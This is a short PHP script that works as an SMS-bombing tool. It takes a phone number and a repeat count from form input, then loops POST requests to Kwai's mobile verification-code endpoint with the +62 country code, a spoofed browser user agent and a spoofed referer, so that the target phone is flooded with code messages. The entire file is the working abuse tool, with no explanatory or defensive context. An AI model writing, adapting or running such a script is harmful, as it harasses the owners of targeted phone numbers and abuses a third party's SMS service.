<?php

$no = $_POST["no"];
$body = '{"mobile":' . $no . ',"countryCode":"+62","bizType":38}';
$loop = $_POST["loop"];
$x = 0;
while($x < $loop) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://m.kwai.com/o/nodeapi/oversea/rest/o/p/mobile/sendMobileCode");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type:application/json","Accept-Encoding:gzip, deflate, br","Connection:keep-alive","Content-Length:55","Referer:https://m.kwai.com/o/indo/invite/friends","User-Agent:Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"));
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
    curl_exec($ch);
    $x++;
    
}
    echo "Sukses dung";

?>